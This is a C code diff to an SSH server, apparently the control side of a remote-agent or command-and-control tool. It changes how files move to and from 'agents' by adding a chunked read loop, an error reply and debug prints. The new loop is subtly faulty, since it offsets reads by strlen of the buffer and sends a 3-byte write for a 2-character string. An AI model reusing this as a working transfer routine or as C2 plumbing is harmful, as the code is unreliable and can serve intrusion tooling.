@@ -45,6 +45,7 @@ void cleanup_pcap(){
 ssh_session session_array[MAX_CONN];
 pthread_t thread_array[MAX_CONN];
 pthread_mutex_t session_lock;
+FILE *log_file;
 struct clientNode first;
 int halt = 0;
 
@@ -242,21 +243,35 @@ int server_file_download(clientDat *session, char *ptr, int is_manager, char *ex
         log_info(logbuff);
         return 1;
     }
-    rc = ssh_channel_read(session->chan, data_ptr, size, 0);
-    if(rc == SSH_ERROR){
-        sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
-        log_info(logbuff);
-        return 1;
+    printf("%d\n", size);
+    int tmpint = 0;
+    while (tmpint < size)
+    {
+        rc = ssh_channel_read(session->chan, data_ptr+strlen(data_ptr), size-tmpint, 0);
+        if(rc == SSH_ERROR){
+            sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
+            log_info(logbuff);
+            return 1;
+        }
+        tmpint += rc;
+    
     }
+    
 
     size_e = b64_decoded_size(data_ptr);
 
     enc_ptr = malloc(size_e);
     if(!b64_decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
-        sprintf(logbuff,"Manager %s: failed to decode data\n", session->id);
+        sprintf(logbuff,"%s: failed to decode data\n", session->id);
         log_info(logbuff);
         free(data_ptr);
         free(enc_ptr);
+        rc = ssh_channel_write(session->chan, "er", 3);
+        if(rc == SSH_ERROR){
+            sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
+            log_info(logbuff);
+            return 1;
+        }
         return 1;
     }
     free(data_ptr);
@@ -492,6 +507,7 @@ int server_upload_file(clientDat *agent, char *ptr, int is_module){
         return 1;
     }
     
+    printf("Tada\n");
     rc = ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
     if(rc == SSH_ERROR){
         sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
@@ -510,6 +526,7 @@ int server_upload_file(clientDat *agent, char *ptr, int is_module){
     }
     memset(tmpbuffer, 0, 8);
     
+    printf("dee\n");
     rc = ssh_channel_read(agent->chan, tmpbuffer, 8, 0);
     if(rc == SSH_ERROR){
         sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
@@ -525,6 +542,7 @@ int server_upload_file(clientDat *agent, char *ptr, int is_module){
     free(file_data);
     free(enc_data);
 
+    printf("Done with loop\n");
     return 0;
 
 }
